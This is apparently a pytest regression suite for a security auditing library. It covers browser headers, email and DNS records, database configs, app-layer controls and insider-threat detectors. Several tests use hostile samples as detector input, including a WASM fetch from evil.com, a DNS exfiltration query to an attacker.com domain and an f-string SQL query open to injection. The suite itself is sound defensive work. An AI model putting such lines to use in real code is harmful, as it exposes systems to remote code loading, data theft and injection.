"""Per-round regression tests for R252 .. R301.

Mirrors the structure of test_security_rounds.py (R1-R51),
test_security_rounds_v2.py (R52-R101), test_security_rounds_v3.py
(R102-R151), test_security_rounds_v4.py (R152-R201), and
test_security_rounds_v5.py (R202-R251).
"""

from __future__ import annotations

import os

import pytest


@pytest.fixture(autouse=True)
def _isolate(monkeypatch):
    monkeypatch.setenv("ARIA_MASTER_KEY", "abcdef0123456789" * 4)
    from aria.security.guard import activate_all_rounds
    from aria.security.plugins import clear_for_tests
    clear_for_tests()
    activate_all_rounds(force_reload=True)
    yield
    clear_for_tests()


# Block AA (R252-R261) — Browser / front-end


class TestR252CSP:
    def test_unsafe_inline_flagged(self):
        from aria.security.rounds.r252_csp_strict import audit_csp
        ok, issues = audit_csp("default-src 'self'; script-src 'self' 'unsafe-inline'")
        assert (not ok) and any("unsafe-inline" in i for i in issues)

    def test_strict_emit_has_nonce(self):
        from aria.security.rounds.r252_csp_strict import make_strict_csp
        header, nonce = make_strict_csp()
        assert nonce in header and "strict-dynamic" in header


class TestR253TrustedTypes:
    def test_directive_required(self):
        from aria.security.rounds.r253_trusted_types import audit_trusted_types
        ok, issues = audit_trusted_types("script-src 'self'")
        assert (not ok) and any("require_directive_missing" in i for i in issues)


class TestR254SRI:
    def test_compute_and_audit(self):
        from aria.security.rounds.r254_sri import compute_sri, audit_html
        sri = compute_sri(b"abc")
        assert sri.startswith("sha384-")
        ok, issues = audit_html('<script src="https://cdn.example.com/x.js"></script>')
        assert (not ok)


class TestR255PermissionsPolicy:
    def test_wildcard_camera(self):
        from aria.security.rounds.r255_permissions_policy import audit_permissions_policy
        ok, issues = audit_permissions_policy("camera=*, microphone=()")
        assert (not ok) and any("wildcard" in i for i in issues)


class TestR256Clickjacking:
    def test_no_protection(self):
        from aria.security.rounds.r256_clickjacking import audit_response_headers
        ok, _ = audit_response_headers({})
        assert not ok

    def test_xfo_deny_passes(self):
        from aria.security.rounds.r256_clickjacking import audit_response_headers
        ok, _ = audit_response_headers({"X-Frame-Options": "DENY"})
        assert ok


class TestR257COOPCOEP:
    def test_isolation_required(self):
        from aria.security.rounds.r257_coop_coep import audit_isolation
        ok, _ = audit_isolation({}, requires_isolation=True)
        assert not ok


class TestR258Referrer:
    def test_too_permissive_in_prod(self, monkeypatch):
        monkeypatch.setenv("ARIA_ENV", "prod")
        from aria.security.rounds.r258_referrer_policy import audit_referrer
        ok, _ = audit_referrer({"Referrer-Policy": "no-referrer-when-downgrade"})
        assert not ok


class TestR259WASM:
    def test_unpinned_origin(self):
        from aria.security.rounds.r259_wasm_sandbox import audit_wasm_in_js
        ok, _ = audit_wasm_in_js(
            'WebAssembly.instantiate(fetch("https://evil.com/x.wasm"))',
            pinned_origins={"https://cdn.trusted.com"},
        )
        assert not ok


class TestR260ServiceWorker:
    def test_non_https_blocked(self):
        from aria.security.rounds.r260_service_worker import audit_sw_registration
        ok, _ = audit_sw_registration(
            origin="http://x.com", script_url="http://x.com/sw.js",
            scope="/scoped", script_bytes=b"x",
        )
        assert not ok


class TestR261PostMessage:
    def test_no_origin_check(self):
        from aria.security.rounds.r261_postmessage_origin import audit_postmessage_handlers
        ok, _ = audit_postmessage_handlers(
            "window.addEventListener('message', function(event) { handle(event.data); });"
        )
        assert not ok


# Block BB (R262-R271) — Email + DNS


class TestR262SPF:
    def test_plus_all_blocked(self):
        from aria.security.rounds.r262_spf_audit import audit_spf_record
        ok, issues = audit_spf_record("v=spf1 ip4:1.2.3.4 +all")
        assert (not ok) and any("plus_all" in i for i in issues)


class TestR263DKIM:
    def test_weak_algo(self):
        from aria.security.rounds.r263_dkim_verify import audit_dkim_header
        ok, _ = audit_dkim_header("v=1; a=rsa-sha1; d=x; s=s; b=z; bh=z; h=From")
        assert not ok


class TestR264DMARC:
    def test_p_none_in_prod(self):
        from aria.security.rounds.r264_dmarc_policy import audit_dmarc
        ok, _ = audit_dmarc("v=DMARC1; p=none", is_production=True)
        assert not ok


class TestR265BIMI:
    def test_logo_not_https(self):
        from aria.security.rounds.r265_bimi import audit_bimi
        ok, _ = audit_bimi("v=BIMI1; l=http://x.com/logo.svg")
        assert not ok


class TestR266ARC:
    def test_cv_fail_flagged(self):
        from aria.security.rounds.r266_arc_chain import audit_arc_chain
        ok, _ = audit_arc_chain(["i=1; cv=fail"])
        assert not ok


class TestR267MTASTS:
    def test_not_enforce_in_prod(self, monkeypatch):
        monkeypatch.setenv("ARIA_ENV", "prod")
        from aria.security.rounds.r267_mta_sts import audit_mta_sts_policy
        ok, _ = audit_mta_sts_policy(
            "version: STSv1\nmode: testing\nmx: a.x\nmax_age: 86400"
        )
        assert not ok


class TestR268TLSRPT:
    def test_no_rua(self):
        from aria.security.rounds.r268_tls_rpt import audit_tls_rpt
        ok, _ = audit_tls_rpt("v=TLSRPTv1")
        assert not ok


class TestR269DNSSEC:
    def test_returns_tuple(self):
        from aria.security.rounds.r269_dnssec import audit_dnssec_chain
        ok, why = audit_dnssec_chain("nonexistent.invalid")
        assert isinstance(ok, bool) and isinstance(why, str)


class TestR270DoT:
    def test_resolver_audit(self):
        from aria.security.rounds.r270_dot import audit_resolver_list, make_dot_query
        ok, _ = audit_resolver_list(["1.2.3.4"])
        assert not ok
        q = make_dot_query("example.com")
        assert b"example" in q


class TestR271DNSExfil:
    def test_long_random_label(self):
        from aria.security.rounds.r271_dns_exfil import score_query, reset_for_tests
        reset_for_tests()
        long_label = "abcdefghijklmnopqrstuvwxyz0123456789"
        score, _ = score_query(f"{long_label}.exfil.attacker.com", qtype="TXT")
        assert score >= 0.4


# Block CC (R272-R281) — Storage + database


class TestR272SQLParam:
    def test_fstring_flagged(self):
        from aria.security.rounds.r272_sql_param import lint_python_sql
        ok, _ = lint_python_sql('cursor.execute(f"SELECT * FROM x WHERE id={uid}")')
        assert not ok


class TestR273RLS:
    def test_disabled_flagged(self):
        from aria.security.rounds.r273_row_level_security import RLSTable, audit_rls_policies
        ok, _ = audit_rls_policies([RLSTable("t", rls_enabled=False)])
        assert not ok


class TestR274StoredProc:
    def test_definer_dynamic_sql(self):
        from aria.security.rounds.r274_stored_proc_perm import audit_proc_definition
        ok, _ = audit_proc_definition(
            "CREATE FUNCTION x() RETURNS void LANGUAGE plpgsql SECURITY DEFINER "
            "AS $$ BEGIN EXECUTE format('SELECT %s', y); END $$;"
        )
        assert not ok


class TestR275PgHba:
    def test_world_trust_blocked(self):
        from aria.security.rounds.r275_pg_hba import audit_pg_hba
        ok, _ = audit_pg_hba("host all all 0.0.0.0/0 trust")
        assert not ok


class TestR276Mongo:
    def test_world_no_auth(self):
        from aria.security.rounds.r276_mongo_auth import audit_mongod_config
        ok, _ = audit_mongod_config({"net": {"bindIp": "0.0.0.0"}, "security": {}})
        assert not ok


class TestR277Redis:
    def test_protected_off_blocked(self):
        from aria.security.rounds.r277_redis_acl import audit_redis_conf
        ok, _ = audit_redis_conf("protected-mode no\nbind 0.0.0.0")
        assert not ok


class TestR278ES:
    def test_security_off_in_prod(self, monkeypatch):
        monkeypatch.setenv("ARIA_ENV", "prod")
        from aria.security.rounds.r278_elasticsearch_security import audit_elasticsearch_yml
        ok, _ = audit_elasticsearch_yml({"xpack.security.enabled": False})
        assert not ok


class TestR279Backup:
    def test_unencrypted_in_prod(self, monkeypatch):
        monkeypatch.setenv("ARIA_ENV", "prod")
        from aria.security.rounds.r279_backup_encryption import BackupDescriptor, audit_backup_descriptor
        ok, _ = audit_backup_descriptor(BackupDescriptor(
            location="s3://x/y", encrypted=False,
        ))
        assert not ok


class TestR280SlowQuery:
    def test_repeated_fingerprint(self):
        from aria.security.rounds.r280_slow_query import (
            record_query, audit_slow_queries, reset_for_tests,
        )
        reset_for_tests()
        for _ in range(25):
            record_query(duration_ms=600.0, principal="a",
                         fingerprint="SELECT * FROM logs", rows_returned=10)
        ok, issues = audit_slow_queries()
        assert (not ok) and any("repeated_fingerprint" in i for i in issues)


class TestR281PoolExhaustion:
    def test_principal_cap(self):
        from aria.security.rounds.r281_pool_exhaustion import (
            acquire, release, reset_for_tests,
        )
        reset_for_tests()
        for _ in range(10):
            acquire("alice", max_per_principal=10)
        refused, _ = acquire("alice", max_per_principal=10)
        for _ in range(10):
            release("alice")
        assert not refused


# Block DD (R282-R291) — App-layer


class TestR282BizRace:
    def test_concurrent_blocked(self):
        from aria.security.rounds.r282_business_logic_race import (
            acquire_business_op, complete_business_op, reset_for_tests,
        )
        reset_for_tests()
        a, _ = acquire_business_op("k1")
        b, _ = acquire_business_op("k1")
        complete_business_op("k1")
        c, _ = acquire_business_op("k1")
        assert a and (not b) and (not c)


class TestR283Workflow:
    def test_bypass_blocked(self):
        from aria.security.rounds.r283_workflow_bypass import (
            define_flow, advance_state, reset_for_tests,
        )
        reset_for_tests()
        define_flow("kyc", ["a", "b", "c"])
        ok, _ = advance_state("kyc", "u", "c")
        assert not ok


class TestR284APIVersion:
    def test_retired_returns_410(self):
        from aria.security.rounds.r284_api_versioning import (
            configure_version, check_version, reset_for_tests,
        )
        reset_for_tests()
        configure_version("v1", state="retired")
        code, _ = check_version("v1")
        assert code == 410


class TestR285GraphQL:
    def test_depth_blocked(self):
        from aria.security.rounds.r285_graphql_complexity import audit_query
        deep = "{" + "a {" * 15 + "x" + "}" * 15 + "}"
        ok, _ = audit_query(deep)
        assert not ok


class TestR286WebSocket:
    def test_no_overlap(self):
        from aria.security.rounds.r286_websocket_subprotocol import negotiate_subprotocol
        ok, chosen, _ = negotiate_subprotocol(["x"], server_allowed=["y"])
        assert (not ok) and chosen == ""


class TestR287SSE:
    def test_oversized_blocked(self):
        from aria.security.rounds.r287_sse_audit import admit_sse_event, reset_for_tests
        reset_for_tests()
        ok, _ = admit_sse_event("s", 1_000_000)
        assert not ok


class TestR288Webhook:
    def test_round_trip(self):
        from aria.security.rounds.r288_webhook_signature import (
            make_signature, verify_webhook, reset_for_tests,
        )
        reset_for_tests()
        sig = make_signature(b"hello", b"secret")
        ok, _ = verify_webhook(b"hello", sig, b"secret")
        assert ok

    def test_replay_blocked(self):
        from aria.security.rounds.r288_webhook_signature import (
            make_signature, verify_webhook, reset_for_tests,
        )
        reset_for_tests()
        sig = make_signature(b"hi", b"s")
        verify_webhook(b"hi", sig, b"s")
        ok, why = verify_webhook(b"hi", sig, b"s")
        assert (not ok) and "replay" in why


class TestR289APIAuth:
    def test_mixed_blocked(self):
        from aria.security.rounds.r289_api_key_oauth import RouteAuthPolicy, classify_request, enforce
        cls = classify_request(has_api_key=True, has_oauth_bearer=True, has_client_cert=False)
        ok, _ = enforce(RouteAuthPolicy("/x", allowed_auth=("oauth",)), cls)
        assert (not ok) and cls == "mixed"


class TestR290Fairness:
    def test_per_tenant_exhaust(self):
        from aria.security.rounds.r290_per_tenant_fairness import (
            configure, consume, reset_for_tests,
        )
        reset_for_tests()
        configure(per_tenant_capacity=3.0, per_tenant_refill_per_second=0.0,
                  global_capacity=100.0)
        for _ in range(3):
            consume("a")
        ok, _ = consume("a")
        assert not ok


class TestR291GRPCReflect:
    def test_reflection_in_prod(self, monkeypatch):
        monkeypatch.setenv("ARIA_ENV", "prod")
        from aria.security.rounds.r291_grpc_reflection_disable import audit_server_descriptor
        ok, _ = audit_server_descriptor(["grpc.reflection.v1.ServerReflection"])
        assert not ok


# Block EE (R292-R301) — Insider depth + capstone v6


class TestR292USB:
    def test_no_policy_passes(self, monkeypatch):
        monkeypatch.delenv("ARIA_USB_POLICY", raising=False)
        from aria.security.rounds.r292_usb_block import boot_check_usb_block
        ok, _ = boot_check_usb_block()
        assert ok


class TestR293Print:
    def test_burst_flagged(self):
        from aria.security.rounds.r293_print_egress_audit import (
            record_print_job, audit_print_burst, reset_for_tests,
        )
        reset_for_tests()
        for _ in range(20):
            record_print_job("u", pages=50, bytes_estimated=10 * 1024 * 1024)
        ok, _ = audit_print_burst("u")
        assert not ok


class TestR294Clipboard:
    def test_oversized(self):
        from aria.security.rounds.r294_clipboard_governor import admit_copy, reset_for_tests
        reset_for_tests()
        ok, _ = admit_copy("u", 1_000_000)
        assert not ok


class TestR295Telemetry:
    def test_no_consent_blocked(self):
        from aria.security.rounds.r295_endpoint_telemetry import (
            consume_telemetry_event, reset_for_tests,
        )
        reset_for_tests()
        ok, _ = consume_telemetry_event("u", "screenshot")
        assert not ok

    def test_consent_then_event(self):
        from aria.security.rounds.r295_endpoint_telemetry import (
            record_consent, consume_telemetry_event, reset_for_tests,
        )
        reset_for_tests()
        record_consent("u", disclosed_event_classes=["screenshot"])
        ok, _ = consume_telemetry_event("u", "screenshot")
        assert ok


class TestR296Travel:
    def test_secret_blocked_when_travelling(self):
        from aria.security.rounds.r296_travel_mode import (
            enable_travel_mode, can_access, reset_for_tests,
        )
        reset_for_tests()
        enable_travel_mode("d", country="CN")
        ok, _ = can_access("d", classification="secret")
        assert not ok


class TestR297ForeignInfluence:
    def test_sanctioned_iso_score(self):
        from aria.security.rounds.r297_foreign_influence import score_counterparty
        score, _ = score_counterparty(primary_country_iso="IR")
        assert score >= 0.5


class TestR298Steg:
    def test_flat_lsb_ciphertext_signature(self):
        from aria.security.rounds.r298_image_steganography import lsb_chi_squared
        # Construct a pair-equalised LSB stream typical of LSB substitution:
        # alternating 0x80 and 0x81 keeps lsb_zeros == lsb_ones and pair_diffs = 0.
        blob = bytes([0x80, 0x81] * 32_768)
        score, _ = lsb_chi_squared(blob)
        assert score >= 0.5


class TestR299CovertTiming:
    def test_regular_intervals(self):
        from aria.security.rounds.r299_covert_timing import score_intervals
        score, _ = score_intervals([10.0] * 50)
        assert score >= 0.5


class TestR300AirGap:
    def test_no_air_gap(self, monkeypatch):
        monkeypatch.delenv("ARIA_AIR_GAP", raising=False)
        from aria.security.rounds.r300_air_gap_radio_disable import boot_check_air_gap
        ok, _ = boot_check_air_gap()
        assert ok


class TestR301RunnerV6:
    def test_full_sweep(self):
        from aria.security.rounds.r301_adversarial_runner_v6 import run_v6, render_v6
        report = run_v6()
        assert report.passed, render_v6(report)
        assert report.caught >= 40
